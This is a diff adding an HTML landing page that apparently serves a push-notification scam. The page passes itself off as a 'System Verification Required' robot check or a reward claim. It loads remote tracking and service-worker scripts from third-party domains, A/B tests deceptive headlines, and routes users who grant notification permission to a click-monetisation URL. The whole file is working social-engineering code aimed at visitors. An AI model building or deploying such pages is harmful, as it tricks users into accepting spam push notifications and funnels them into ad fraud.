@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow">
+  <title>Important Notice</title>
+
+  <!-- Основной partners.house -->
+  <script type="text/javascript" src="https://hotbdoxexe.today/process.js?id=1455369099&p1={clickid}&p2={campaign_id}&p3={country}&p4={landing_id}" async></script>
+
+  <!-- Сервис воркер -->
+  <script src="https://mst.luvesso.com/phsw3.js"></script>
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #272837;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      color: #fff;
+    }
+    .container {
+      max-width: 500px;
+      margin: 40px auto;
+      background: #1e1f2b;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    .notice-img {
+      max-width: 100px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 22px;
+      color: #f1c40f;
+    }
+    p {
+      font-size: 16px;
+      color: #ddd;
+      margin-bottom: 20px;
+    }
+    .btn {
+      background: #3498db;
+      color: white;
+      padding: 14px 28px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background: #2980b9;
+    }
+    .footer-btn {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: #1e1f2b;
+      padding: 12px;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
+    }
+    .footer-btn .btn {
+      width: 90%;
+      max-width: 400px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="notice-img" src="https://cdn-icons-png.flaticon.com/512/595/595067.png" alt="Alert Icon">
+    <h1>System Verification Required</h1>
+    <p>To continue, please confirm that you're not a robot and accept important browser notifications.</p>
+    <button class="btn" onclick="subscribeUser()">Continue</button>
+  </div>
+
+  <div class="footer-btn">
+    <button class="btn" onclick="subscribeUser()">Continue</button>
+  </div>
+
+  <script>
+// A/B тест заголовков и описаний по параметру ?tx=1/2/3
+const urlParams = new URLSearchParams(window.location.search);
+const tx = urlParams.get("tx");
+const h1 = document.querySelector("h1");
+const p = document.querySelector("p");
+
+switch (tx) {
+  case "1":
+    h1.textContent = "Verify Your Identity";
+    p.textContent = "Please confirm you're not a robot by enabling notifications.";
+    break;
+  case "2":
+    h1.textContent = "Congratulations!";
+    p.textContent = "Click \"Allow\" to claim your exclusive reward.";
+    break;
+  case "3":
+    h1.textContent = "Access Restricted";
+    p.textContent = "Enable browser notifications to continue.";
+    break;
+  default:
+    h1.textContent = "System Verification Required";
+    p.textContent = "To continue, please confirm that you're not a robot and accept important browser notifications.";
+}
+
+
+    // Логика подписки и фильтрации
+    function subscribeUser() {
+      if (typeof window._phv2Activator !== 'undefined') {
+        window._phv2Activator.activate('native_web_push');
+
+        setTimeout(() => {
+          if (Notification.permission === 'granted') {
+            window.location.href = 'https://srv.zentrelix.click/click?lp=1';
+          } else {
+            window.location.href = 'thankyou.html';
+          }
+        }, 4000); // 4 секунды на взаимодействие
+
+      } else {
+        alert("Push system not ready");
+      }
+    }
+  </script>
+</body>
+</html>
